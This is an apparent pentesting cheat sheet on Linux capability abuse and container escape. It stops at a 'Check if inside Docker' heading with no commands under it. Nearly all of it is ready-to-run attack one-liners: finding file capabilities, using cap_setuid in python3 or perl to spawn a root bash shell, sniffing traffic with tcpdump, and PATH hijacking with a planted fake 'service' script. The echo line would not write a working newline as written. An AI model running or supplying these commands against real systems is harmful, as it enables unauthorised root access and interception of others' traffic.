🐧 Linux — Capabilities & Container Escape

Capabilities Exploitation 
# Find capabilities
getcap -r / 2>/dev/null

# cap_setuid (python, perl, etc.) → root
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

# cap_net_raw (tcpdump with cap) — sniff traffic
tcpdump -i eth0 -w /tmp/capture.pcap

# PATH hijacking via writable path entry
find / -writable -type d 2>/dev/null
export PATH=/tmp:$PATH
echo '#!/bin/bash\n/bin/bash -i' > /tmp/service  # if SUID binary calls 'service'
chmod +x /tmp/service

# Check if inside Docker
